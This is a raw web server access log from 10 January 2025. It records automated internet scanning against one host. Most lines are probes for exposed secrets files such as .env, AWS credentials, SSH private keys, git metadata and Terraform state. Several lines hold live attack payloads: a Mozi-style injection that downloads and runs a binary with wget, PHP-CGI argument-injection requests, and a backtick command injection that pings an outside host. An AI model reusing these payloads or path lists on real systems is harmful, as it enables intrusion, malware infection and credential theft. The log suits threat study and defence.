66.240.205.34 - - [10/Jan/2025:00:06:01 +0000] "Gh0st\xad" 400 526 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:34 +0000] "GET /repo/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:34 +0000] "GET /public/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:35 +0000] "GET /main.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:35 +0000] "GET /main.yml HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:35 +0000] "GET /main/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:35 +0000] "GET /latest/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:35 +0000] "GET /js/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:36 +0000] "GET /js/config.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:36 +0000] "GET /js/envConfig.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:36 +0000] "GET /manual/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:36 +0000] "GET /debug.log HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:36 +0000] "GET /errors.log HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:37 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:37 +0000] "GET /config.yml HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:37 +0000] "GET /settings.py HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:37 +0000] "GET /local_settings.py HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:37 +0000] "GET /web.config HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:38 +0000] "GET /application.properties HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:38 +0000] "GET /config.php HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:38 +0000] "GET /.htaccess HTTP/1.1" 403 494 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:38 +0000] "GET /nginx.conf HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:39 +0000] "GET /scripts/config.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:39 +0000] "GET /app/config.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:39 +0000] "GET /env.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:39 +0000] "GET /settings.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:39 +0000] "GET /config/config.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:40 +0000] "GET /static/js/config.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:40 +0000] "GET /.env.js HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:40 +0000] "GET /.git/config HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:40 +0000] "GET /.git/HEAD HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:40 +0000] "GET /.git/index HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:41 +0000] "GET /.git/logs/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:41 +0000] "GET /.git/objects/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:41 +0000] "GET /.git/refs/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:41 +0000] "GET /.git/packed-refs HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:41 +0000] "GET /.gitignore HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:42 +0000] "GET /.gitattributes HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:42 +0000] "GET /.gitmodules HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:42 +0000] "GET /.svn/entries HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:42 +0000] "GET /.svn/props HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:42 +0000] "GET /.svn/text-base/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:43 +0000] "GET /.svn/pristine/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:43 +0000] "GET /.svn/all-wcprops HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:43 +0000] "GET /.svn/dir-wcprops HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:43 +0000] "GET /aws-codecommit/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:44 +0000] "GET /config/aws-codecommit-config.yml HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:44 +0000] "GET /.aws/credentials HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:44 +0000] "GET /.aws/config HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:44 +0000] "GET /.aws_codecommit_secrets.json HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:44 +0000] "GET /aws_codecommit_config.json HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:45 +0000] "GET /s3-bucket/config.json HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:45 +0000] "GET /s3-bucket/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:45 +0000] "GET /bucket-listing/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:45 +0000] "GET /bucket/config/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:45 +0000] "GET /aws-s3/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:46 +0000] "GET /s3/secrets.yml HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:46 +0000] "GET /s3/secrets.json HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:46 +0000] "GET /.aws/s3-config HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:46 +0000] "GET /.aws/s3-bucket.json HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:46 +0000] "GET /app/config/parameters.yml HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:47 +0000] "GET /composer.lock HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:47 +0000] "GET /package-lock.json HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:47 +0000] "GET /yarn.lock HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:47 +0000] "GET /pipfile.lock HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:47 +0000] "GET /Gemfile.lock HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:48 +0000] "GET /.npmrc HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:48 +0000] "GET /.pypirc HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:48 +0000] "GET /.gitlab-ci.yml HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:48 +0000] "GET /.github/workflows/ HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:48 +0000] "GET /.vscode/settings.json HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:49 +0000] "GET /IDEA/workspace.xml HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:49 +0000] "GET /terraform.tfstate HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:49 +0000] "GET /terraform.tfstate.backup HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:49 +0000] "GET /.ssh/id_rsa HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:49 +0000] "GET /.ssh/known_hosts HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [10/Jan/2025:09:24:50 +0000] "GET /../js/brand.js HTTP/1.1" 400 487 "-" "-"
125.25.220.55 - - [10/Jan/2025:09:25:38 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.226 - - [10/Jan/2025:09:26:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [10/Jan/2025:09:31:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:09:31:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [10/Jan/2025:09:32:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
59.182.69.114 - - [10/Jan/2025:09:36:32 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 526 "-" "-"
64.226.79.58 - - [10/Jan/2025:09:42:15 +0000] "\x16\x03\x01\x01$\x01" 400 526 "-" "-"
198.135.182.66 - - [10/Jan/2025:09:45:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
42.200.150.223 - - [10/Jan/2025:09:50:44 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+allow_url_include%3Don+%ADd+auto_prepend_file%3Dphp%3A//input HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
42.200.150.223 - - [10/Jan/2025:09:50:44 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
42.200.150.223 - - [10/Jan/2025:09:50:44 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
42.200.150.223 - - [10/Jan/2025:09:50:44 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
5.181.190.248 - - [10/Jan/2025:10:06:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.196.220.253 - - [10/Jan/2025:10:19:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
198.235.24.30 - - [10/Jan/2025:10:20:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.148.25.122 - - [10/Jan/2025:10:24:10 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
124.153.146.18 - - [10/Jan/2025:10:26:29 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [10/Jan/2025:10:27:14 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:10:27:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [10/Jan/2025:10:39:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
164.52.24.179 - - [10/Jan/2025:10:45:45 +0000] "\x16\x03\x01\x02" 400 526 "-" "-"
164.52.24.179 - - [10/Jan/2025:10:45:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [10/Jan/2025:10:45:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
164.52.24.179 - - [10/Jan/2025:10:45:52 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [10/Jan/2025:10:45:55 +0000] "GET / HTTP/1.1" 200 1684 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:10:49:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:10:49:05 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
122.116.1.10 - - [10/Jan/2025:11:02:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
51.91.174.244 - - [10/Jan/2025:11:04:37 +0000] "\x16\x03\x03\x01\xa6\x01" 400 526 "-" "-"
51.91.174.249 - - [10/Jan/2025:11:04:41 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
78.153.140.93 - - [10/Jan/2025:11:08:46 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:11:08:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.196.113.0 - - [10/Jan/2025:11:12:15 +0000] "\x16\x03\x03\x01\xa6\x01" 400 526 "-" "-"
5.196.113.12 - - [10/Jan/2025:11:12:18 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
51.91.174.243 - - [10/Jan/2025:11:13:46 +0000] "\x16\x03\x03\x01\xa6\x01" 400 526 "-" "-"
5.196.113.15 - - [10/Jan/2025:11:14:00 +0000] "\x16\x03\x03\x01\xa6\x01" 400 526 "-" "-"
93.45.33.37 - - [10/Jan/2025:11:15:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.242.226.10 - - [10/Jan/2025:11:25:40 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
114.35.46.122 - - [10/Jan/2025:11:26:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
151.236.216.5 - - [10/Jan/2025:11:30:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
151.236.216.5 - - [10/Jan/2025:11:30:02 +0000] "\x16\x03\x01" 400 526 "-" "-"
151.236.216.5 - - [10/Jan/2025:11:30:02 +0000] "\x16\x03\x01" 400 526 "-" "-"
151.236.216.5 - - [10/Jan/2025:11:30:03 +0000] "\x16\x03\x01" 400 526 "-" "-"
95.214.53.198 - - [10/Jan/2025:11:46:48 +0000] "GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60ping+-c+1+95.214.54.154%60 HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
192.244.100.146 - - [10/Jan/2025:11:50:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.226 - - [10/Jan/2025:12:09:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [10/Jan/2025:12:14:22 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:12:14:23 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.156.128.41 - - [10/Jan/2025:12:30:58 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.128.127 - - [10/Jan/2025:12:30:59 +0000] "GET /css/images/PTZOptics_powerby.png HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.128.129 - - [10/Jan/2025:12:33:11 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:12:33:23 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:12:33:24 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:12:39:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:12:39:25 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
122.100.118.247 - - [10/Jan/2025:12:40:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
114.34.157.91 - - [10/Jan/2025:12:47:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
93.174.93.12 - - [10/Jan/2025:12:54:22 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
36.91.180.98 - - [10/Jan/2025:13:17:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
139.59.101.104 - - [10/Jan/2025:13:19:13 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
13.87.133.189 - - [10/Jan/2025:13:27:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
148.153.56.82 - - [10/Jan/2025:13:27:18 +0000] "GET /UadB HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [10/Jan/2025:13:27:20 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/UadB" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [10/Jan/2025:13:27:20 +0000] "GET /URjL HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [10/Jan/2025:13:27:21 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/URjL" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [10/Jan/2025:13:27:21 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [10/Jan/2025:13:27:21 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [10/Jan/2025:13:27:22 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [10/Jan/2025:13:27:23 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
195.3.223.55 - - [10/Jan/2025:13:34:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
31.13.224.222 - - [10/Jan/2025:13:35:37 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
193.34.212.75 - - [10/Jan/2025:13:39:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.16.39.104 - - [10/Jan/2025:13:48:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [10/Jan/2025:13:54:07 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:13:54:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:14:01:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:14:01:34 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
81.161.238.40 - - [10/Jan/2025:14:02:43 +0000] "GET /.env HTTP/1.1" 302 350 "-" "msnbot/1.0 ( http://search.msn.com/msnbot.htm)"
47.254.245.83 - - [10/Jan/2025:14:04:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "curl/7.64.1"
78.153.140.93 - - [10/Jan/2025:14:35:14 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:14:35:14 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
43.153.216.189 - - [10/Jan/2025:14:55:34 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
73.73.8.172 - - [10/Jan/2025:15:02:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [10/Jan/2025:15:14:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:15:14:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [10/Jan/2025:15:19:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [10/Jan/2025:15:25:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
